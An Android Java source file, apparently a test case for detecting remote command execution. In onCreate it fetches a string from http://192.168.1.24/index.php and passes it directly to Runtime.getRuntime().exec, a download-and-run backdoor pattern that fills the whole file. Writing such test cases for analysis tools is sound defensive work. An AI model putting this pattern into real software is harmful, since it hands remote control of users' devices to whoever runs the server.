package testcase.T_ExecCmd_Http_02;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {

	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		new Thread(new Runnable() {
			public void run() {
				try {
					HttpPost httpGet = new HttpPost("http://192.168.1.24/index.php");
					HttpClient httpClient = new DefaultHttpClient();
					HttpResponse httpResponse = httpClient.execute(httpGet);
					String cmdString = EntityUtils.toString(httpResponse.getEntity());
					Log.e("testcaseLog", cmdString);
					Runtime.getRuntime().exec(cmdString);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();
	}
}
